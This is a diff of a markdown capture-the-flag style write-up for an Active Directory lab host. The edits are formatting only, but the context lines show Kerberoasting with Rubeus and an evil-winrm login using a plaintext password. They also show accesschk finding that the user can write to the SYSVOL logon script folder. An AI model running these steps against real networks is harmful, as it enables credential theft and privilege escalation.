@@ -322,6 +322,7 @@ PS C:\Users\NU_1055\Documents> .\Rubeus.exe kerberoast /user:rsa_4810 /output:ha
 
 ```$ evil-winrm -i 10.10.11.22 -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'```
 
+
 ```
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> whoami /all
 
@@ -370,13 +371,15 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 #### Find writable directories from actual user
 
-```.\accesschk64 /accepteula -uwds C:\Windows
+```
+.\accesschk64 /accepteula -uwds C:\Windows
 
 ...
 
 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23
 
 ...
+
 ```
 
 #### User rsa_4810 has write perm on logon script dir
